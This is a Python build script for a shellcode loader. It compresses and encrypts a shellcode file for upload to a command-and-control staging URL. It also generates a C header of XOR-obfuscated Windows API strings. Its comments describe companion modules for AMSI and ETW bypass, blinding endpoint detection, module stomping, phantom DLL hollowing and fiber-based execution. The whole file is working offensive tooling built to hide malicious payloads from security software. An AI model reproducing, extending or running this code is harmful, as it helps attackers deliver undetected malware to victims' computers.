#!/usr/bin/env python3
"""
Encrypt.py - Shellcode Encryption & Build Randomizer

Usage:
  python Encrypt.py <shellcode.bin> --url https://your-server/data.enc

Generates:
  data.enc  - LZNT1-compressed + Chaskey-CTR-encrypted shellcode (upload to C2)
  Payload.h - Encryption params + randomized string obfuscation
"""

import sys
import os
import random
import struct

# All sensitive strings — 4-byte rotating XOR key randomized each run
OBFUSCATED_STRINGS = {
    # Evasion.c
    "XSTR_NTDLL_DLL":               "ntdll.dll",
    "XSTR_ETW_EVENT_WRITE":         "EtwEventWrite",
    "XSTR_AMSI_DLL":                "amsi.dll",
    "XSTR_AMSI_SCAN_BUFFER":        "AmsiScanBuffer",
    # Staging.c
    "XSTR_WININET_DLL":             "wininet.dll",
    "XSTR_INTERNET_OPEN_A":         "InternetOpenA",
    "XSTR_INTERNET_CONNECT_A":      "InternetConnectA",
    "XSTR_HTTP_OPEN_REQUEST_A":     "HttpOpenRequestA",
    "XSTR_HTTP_SEND_REQUEST_A":     "HttpSendRequestA",
    "XSTR_INTERNET_READ_FILE":      "InternetReadFile",
    "XSTR_INTERNET_CLOSE_HANDLE":   "InternetCloseHandle",
    "XSTR_INTERNET_SET_OPTION_A":   "InternetSetOptionA",
    "XSTR_INTERNET_QUERY_OPTION_A": "InternetQueryOptionA",
    "XSTR_INTERNET_CRACK_URL_A":    "InternetCrackUrlA",
    "XSTR_USER_AGENT":              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "XSTR_HTTP_GET":                "GET",
    "XSTR_HTTP_QUERY_INFO_A":       "HttpQueryInfoA",
    # Stomper.c (sacrificial DLL for module stomping / phantom hollowing)
    "XSTR_STOMP_DLL":               "msftedit.dll",
    # Evasion.c (patchless AMSI/ETW via VEH + hardware breakpoints)
    "XSTR_RTL_ADD_VEH":             "RtlAddVectoredExceptionHandler",
    "XSTR_RTL_REMOVE_VEH":          "RtlRemoveVectoredExceptionHandler",
    "XSTR_NT_CONTINUE":             "NtContinue",
    "XSTR_RTL_CAPTURE_CTX":         "RtlCaptureContext",
    # Stomper.c (phantom DLL hollowing via NTFS transactions)
    "XSTR_KTMW32_DLL":              "ktmw32.dll",
    "XSTR_CREATE_TRANSACTION":      "CreateTransaction",
    "XSTR_CREATE_FILE_TXA":         "CreateFileTransactedA",
    "XSTR_ROLLBACK_TRANSACTION":    "RollbackTransaction",
    "XSTR_KERNEL32_DLL":            "kernel32.dll",
    "XSTR_SYS32_PREFIX":            "C:\\Windows\\System32\\",
    "XSTR_GET_TEMP_PATH_A":         "GetTempPathA",
    "XSTR_COPY_FILE_A":             "CopyFileA",
    "XSTR_FIND_FIRST_FILE_A":       "FindFirstFileA",
    "XSTR_FIND_NEXT_FILE_A":        "FindNextFileA",
    "XSTR_FIND_CLOSE":              "FindClose",
    "XSTR_CREATE_FILE_A":           "CreateFileA",
    "XSTR_DLL_WILDCARD":            "*.dll",
    # Crypt.c (decompression via ntdll)
    "XSTR_RTL_DECOMPRESS_BUFFER":   "RtlDecompressBuffer",
    # Evasion.c (DLL notification callback removal — EDR blinding)
    "XSTR_LDR_REG_DLL_NOTIF":      "LdrRegisterDllNotification",
    "XSTR_LDR_UNREG_DLL_NOTIF":    "LdrUnregisterDllNotification",
    # Syscalls.c (clean ntdll via \KnownDlls\ntdll.dll section)
    "XSTR_KNOWNDLLS_NTDLL":        "\\KnownDlls\\ntdll.dll",
    # main.c (Poison Fiber kick-off — avoids PsSetCreateThreadNotifyRoutine)
    "XSTR_CONVERT_THREAD_TO_FIBER": "ConvertThreadToFiber",
    "XSTR_CREATE_FIBER":            "CreateFiber",
    "XSTR_SWITCH_TO_FIBER":         "SwitchToFiber",
}


# ---- Chaskey-12 Block Cipher (ARX, 128-bit) ----

def rotl32(x, n):
    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF


def chaskey_permute(v):
    """Chaskey-12 permutation (12 rounds)."""
    for _ in range(12):
        v[0] = (v[0] + v[1]) & 0xFFFFFFFF
        v[1] = rotl32(v[1], 5)
        v[1] ^= v[0]
        v[0] = rotl32(v[0], 16)
        v[2] = (v[2] + v[3]) & 0xFFFFFFFF
        v[3] = rotl32(v[3], 8)
        v[3] ^= v[2]
        v[0] = (v[0] + v[3]) & 0xFFFFFFFF
        v[3] = rotl32(v[3], 13)
        v[3] ^= v[0]
        v[2] = (v[2] + v[1]) & 0xFFFFFFFF
        v[1] = rotl32(v[1], 7)
        v[1] ^= v[2]
        v[2] = rotl32(v[2], 16)
    return v


def chaskey_ctr_crypt(data, key_bytes, nonce_bytes):
    """Chaskey-CTR encryption/decryption (symmetric)."""
    key = list(struct.unpack('<4I', key_bytes))
    nonce = list(struct.unpack('<3I', nonce_bytes[:12]))

    result = bytearray()
    for blk in range((len(data) + 15) // 16):
        ctr = [nonce[0] ^ key[0], nonce[1] ^ key[1], nonce[2] ^ key[2], blk ^ key[3]]
        ctr = chaskey_permute(list(ctr))
        ctr[0] ^= key[0]
        ctr[1] ^= key[1]
        ctr[2] ^= key[2]
        ctr[3] ^= key[3]
        keystream = struct.pack('<4I', *ctr)

        offset = blk * 16
        chunk = data[offset:offset + 16]
        for i in range(len(chunk)):
            result.append(chunk[i] ^ keystream[i])

    return bytes(result)


# ---- LZNT1 Compression (via Windows ntdll) ----

def lznt1_compress(data):
    """Compress data using LZNT1 via ntdll (Windows only)."""
    if sys.platform != 'win32':
        print("[!] LZNT1 compression requires Windows, skipping")
        return None

    import ctypes
    ntdll = ctypes.windll.ntdll

    COMPRESSION_FORMAT_LZNT1 = 0x0002
    COMPRESSION_ENGINE_STANDARD = 0x0000
    fmt = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD

    ws_size = ctypes.c_ulong(0)
    fws_size = ctypes.c_ulong(0)
    status = ntdll.RtlGetCompressionWorkSpaceSize(
        fmt, ctypes.byref(ws_size), ctypes.byref(fws_size)
    )
    if status != 0:
        print(f"[!] RtlGetCompressionWorkSpaceSize failed: 0x{status:08X}")
        return None

    workspace = ctypes.create_string_buffer(ws_size.value)
    out_size = len(data) * 2 + 4096
    out_buf = ctypes.create_string_buffer(out_size)
    final_size = ctypes.c_ulong(0)

    status = ntdll.RtlCompressBuffer(
        fmt, data, len(data),
        out_buf, out_size, 4096,
        ctypes.byref(final_size), workspace
    )
    if status != 0:
        print(f"[!] RtlCompressBuffer failed: 0x{status:08X}")
        return None

    return bytes(out_buf[:final_size.value])


# ---- Key Protection ----

def generate_protected_key(key):
    """Protect key with reversible transformation. Requires brute-forcing 1 byte."""
    b = random.randint(1, 255)
    protected = bytearray()
    for i, byte_val in enumerate(key):
        protected.append(((byte_val + i) ^ b) & 0xFF)
    return bytes(protected), b


# ---- String Obfuscation (4-byte rotating XOR key) ----

def pick_xor_keys(strings_dict):
    """Pick 4 random XOR key bytes. Each key byte avoids producing 0x00 at its positions."""
    keys = []
    for pos in range(4):
        chars_at_pos = set()
        for s in strings_dict.values():
            data = s.encode('ascii')
            for i in range(pos, len(data), 4):
                chars_at_pos.add(data[i])
        valid = [k for k in range(1, 256) if k not in chars_at_pos]
        if not valid:
            raise ValueError(f"No valid XOR key for position {pos}")
        keys.append(random.choice(valid))
    return keys


def xor_encode_string(s, keys):
    """XOR-encode string with 4-byte rotating key, append raw 0x00 terminator."""
    encoded = []
    for i, b in enumerate(s.encode('ascii')):
        encoded.append((b ^ keys[i % 4]) & 0xFF)
    encoded.append(0x00)
    return encoded


def format_initializer(name, data, items_per_line=16):
    """Format as #define NAME { 0x.., ... }"""
    if len(data) <= items_per_line:
        vals = ", ".join(f"0x{b:02X}" for b in data)
        return f"#define {name} {{ {vals} }}"

    lines = [f"#define {name} {{ \\"]
    for i in range(0, len(data), items_per_line):
        chunk = data[i:i + items_per_line]
        vals = ", ".join(f"0x{b:02X}" for b in chunk)
        if i + items_per_line < len(data):
            lines.append(f"    {vals}, \\")
        else:
            lines.append(f"    {vals} \\")
    lines.append("}")
    return "\n".join(lines)


def main():
    if len(sys.argv) < 4 or "--url" not in sys.argv:
        print(f"Usage: {sys.argv[0]} <shellcode.bin> --url https://server/data.enc")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    idx = sys.argv.index("--url")
    staging_url = sys.argv[idx + 1]

    with open(shellcode_path, "rb") as f:
        shellcode = f.read()

    print(f"[*] Shellcode: {len(shellcode)} bytes ({len(shellcode)/1024/1024:.1f} MB)")

    # --- LZNT1 Compression ---
    compressed = lznt1_compress(shellcode)
    if compressed and len(compressed) < len(shellcode):
        use_compression = True
        payload_data = compressed
        print(f"[+] Compressed: {len(shellcode)} -> {len(compressed)} bytes "
              f"({len(compressed)*100//len(shellcode)}%)")
    else:
        use_compression = False
        payload_data = shellcode
        if compressed:
            print(f"[*] Compression didn't help ({len(compressed)} >= {len(shellcode)}), skipping")
        else:
            print(f"[*] Compression unavailable, skipping")

    # --- Chaskey-CTR Encryption ---
    key_size = 16
    chaskey_key = bytes(random.randint(0, 255) for _ in range(key_size))
    chaskey_nonce = bytes(random.randint(0, 255) for _ in range(12))
    hint_byte = chaskey_key[0]

    print(f"[*] Encrypting with Chaskey-CTR...")
    encrypted = chaskey_ctr_crypt(payload_data, chaskey_key, chaskey_nonce)
    protected_key, brute_byte = generate_protected_key(chaskey_key)

    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Write encrypted payload
    enc_path = os.path.join(script_dir, "data.enc")
    with open(enc_path, "wb") as f:
        f.write(encrypted)
    print(f"[+] data.enc: {len(encrypted)} bytes")

    # Pick random 4-byte XOR key for string obfuscation
    xkeys = pick_xor_keys(OBFUSCATED_STRINGS)
    print(f"[+] XKEY: [{', '.join(f'0x{k:02X}' for k in xkeys)}]")

    # XOR-encode the URL with its own random key
    url_bytes = staging_url.encode() + b'\x00'
    url_xor_key = random.randint(1, 255)
    xored_url = bytes([(b ^ url_xor_key) & 0xFF for b in url_bytes])

    # --- Generate Payload.h ---
    lines = []
    lines.append("#pragma once")
    lines.append("")
    lines.append("// Auto-generated by Encrypt.py \u2014 do not edit")
    lines.append("// Randomized values change every build")
    lines.append("")
    lines.append(f"#define PAYLOAD_SIZE    {len(shellcode)}")
    lines.append(f"#define KEY_SIZE        {key_size}")
    lines.append(f"#define HINT_BYTE       0x{hint_byte:02X}")
    lines.append(f"#define URL_XOR_KEY     0x{url_xor_key:02X}")
    lines.append(f"#define URL_LENGTH      {len(url_bytes)}")
    lines.append(f"#define USE_COMPRESSION {1 if use_compression else 0}")
    lines.append("")
    lines.append("// 4-byte string obfuscation key (randomized per build)")
    for i, k in enumerate(xkeys):
        lines.append(f"#define XKEY_{i}          0x{k:02X}")
    lines.append("")
    lines.append(format_initializer("INIT_ENCODED_URL", xored_url))
    lines.append("")
    lines.append(format_initializer("INIT_PROTECTED_KEY", protected_key))
    lines.append("")
    lines.append("// Chaskey-CTR nonce (12 bytes)")
    lines.append(format_initializer("INIT_CHASKEY_NONCE", chaskey_nonce))
    lines.append("")

    # Obfuscated API/DLL strings
    lines.append("// Obfuscated strings (4-byte rotating XOR, randomized per build)")
    for name, plaintext in OBFUSCATED_STRINGS.items():
        encoded = xor_encode_string(plaintext, xkeys)
        lines.append(format_initializer(name, encoded))
    lines.append("")

    with open(os.path.join(script_dir, "Payload.h"), "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"[+] Payload.h generated")

    # --- Verify encryption ---
    recovered = bytearray()
    b = 0
    while ((protected_key[0] ^ b) - 0) != hint_byte:
        b += 1
    for i in range(key_size):
        recovered.append(((protected_key[i] ^ b) - i) & 0xFF)
    assert bytes(recovered) == chaskey_key, "Key recovery failed"

    decrypted = chaskey_ctr_crypt(encrypted, bytes(recovered), chaskey_nonce)
    assert decrypted == payload_data, "Decryption verification failed"
    print(f"[+] Encryption verification PASSED")

    # Verify decompression if used
    if use_compression:
        import ctypes
        ntdll = ctypes.windll.ntdll
        out_buf = ctypes.create_string_buffer(len(shellcode))
        final_size = ctypes.c_ulong(0)
        status = ntdll.RtlDecompressBuffer(
            0x0002, out_buf, len(shellcode),
            payload_data, len(payload_data),
            ctypes.byref(final_size)
        )
        assert status == 0 and final_size.value == len(shellcode)
        assert bytes(out_buf[:final_size.value]) == shellcode
        print(f"[+] Compression verification PASSED")

    # Verify string obfuscation
    first_name = list(OBFUSCATED_STRINGS.keys())[0]
    first_plain = OBFUSCATED_STRINGS[first_name]
    first_encoded = xor_encode_string(first_plain, xkeys)
    for i, byte_val in enumerate(first_encoded[:-1]):
        assert (byte_val ^ xkeys[i % 4]) == first_plain.encode('ascii')[i]
    print(f"[+] String obfuscation verified")

    print(f"\n[*] Upload data.enc to: {staging_url}")
    print(f"[*] Then build: build.bat")


if __name__ == "__main__":
    main()
